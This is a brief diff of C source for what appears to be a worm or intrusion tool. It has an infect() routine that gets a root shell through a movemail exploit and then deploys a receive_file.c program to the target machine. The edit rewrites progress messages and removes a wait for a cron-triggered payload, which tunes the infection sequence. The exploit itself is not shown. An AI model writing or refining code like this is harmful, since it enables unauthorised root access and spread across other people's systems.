@@ -57,7 +57,7 @@ void deploy_receive_file(sock, my_ip)
     char *formatted_source;
     char *file_contents;
     
-    printf("[*] Deploying receive_file.c to target: %s\n", my_ip);
+    printf("[*] Deploying receive_file.c to target\n");
 
     formatted_source = (char *)malloc(10000); 
     if (formatted_source == (char *)0) return;
@@ -126,9 +126,7 @@ void infect(ip, my_ip)
     sleep(5);
 
     get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
-    printf("[*] Waiting for cron daemon to execute payload (65s)...\n");
-    sleep(65);
-    printf("[*] Wait over\n");
+    printf("[*] Should have root shell now\n");
 
     deploy_receive_file(sock, my_ip);
     
